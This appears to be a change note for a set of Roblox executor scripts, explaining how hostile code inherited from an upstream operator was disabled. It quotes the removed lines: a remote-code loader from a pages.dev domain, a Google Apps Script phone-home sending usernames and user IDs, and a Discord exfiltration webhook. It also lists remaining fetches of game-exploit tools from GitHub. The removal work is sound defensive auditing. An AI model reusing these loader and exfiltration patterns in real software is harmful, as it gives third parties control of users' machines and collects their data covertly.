# What was removed, and why

The recovered payloads came from a project whose operator has since locked their
own distribution behind a licence. Two things they shipped are not acceptable in
a build that carries your name: remote code execution from a domain they control,
and silent data collection. Both are gone.

Everything below is commented out or blanked, never deleted, so each change is
one uncomment away from reversal.

## 1. Remote code execution — `upio-github-mirror.pages.dev/source.lua`

Present in `GardenWorld.lua`, `TradingWorld.lua` and `void.lua`:

```lua
B = (loadstring(game:HttpGet("https://upio-github-mirror.pages.dev/source.lua")))()
```

This downloads Lua and executes it. It nominally supplies the Obsidian UI icon
set, but anything served from that URL runs with your users' permissions. This is
the same shape as the mechanism that turned the Steal An Egg payload into a
"moved to a new loader" panel — a hostile operator edits one file and every
client changes behaviour.

**Removed:** the assignment line. The enclosing `pcall` body is now empty, the
variable stays `nil`, and the following `if <var> then … SetIconModule … end`
guard never fires. Scripts run without icons.

## 2. Phone-home / kill-switch — `script.google.com` (TradingWorld only)

```lua
local u = "https://script.google.com/macros/s/AKfycb…/exec"
task.spawn(function ()
    local J = u..("?username="..UrlEncode(h.Name)..("&userId="..tostring(h.UserId)))
    …
end)
```

Fire-and-forget: it posts the player's **username and UserId** to a Google Apps
Script the operator controls. Nothing consumed the response, so it existed purely
to tell them who was running the script. Apps Scripts are editable, which also
makes it a kill-switch channel.

**Removed:** the whole block, 18 lines. Nothing downstream broke.

## 3. Hard-coded exfil webhook — Discord `1521194823326105821` (void only)

```lua
local h = "https://discord.com/api/webhooks/1521194823326105821/vBWxVd6…"
```

Posted pet and event data to the operator's Discord on every match. Not
user-visible, not configurable.

**Removed:** the URL is now `""`, so the `pcall`'d POST silently no-ops.

The webhook field in Settings is untouched — that one is the user's own, defaults
to empty, and is gated behind its own toggle.

## Verifying

```bash
for f in GardenWorld.lua TradingWorld.lua void.lua; do
  echo "== $f"
  grep -c 'upio-github-mirror' "$f"
  grep -c '1521194823326105821' "$f"
  grep -c 'script.google.com' "$f"
done
```

Matches should only appear on commented lines (`--` at the start of the line).

## What is still fetched, and why it is fine

| URL | purpose |
|---|---|
| `raw.githubusercontent.com/deividcomsono/Obsidian/main/` | the Obsidian UI library the scripts are built on |
| `github.com/AZYsGithub/DexPlusPlus/…/out.lua` | Roblox explorer, loaded only when the user opens it |
| `github.com/notpoiu/cobalt/…/Cobalt.luau` | same, user-triggered |
| `raw.githubusercontent.com/Klinac/scripts/main/utopia_spy.lua` | same |
| `games.roblox.com/v1/games/…` | Roblox's own server-list API, used for server hopping |

These are either the UI framework itself or things the user explicitly opens.
None of them are owned by the original operator.

## Reversing any of this

Every removed line carries `-- REMOVED: …` at the end. Delete the leading `-- `
to restore it. Do not do this casually — items 1 and 2 are how a third party
changes what your users' executors run.
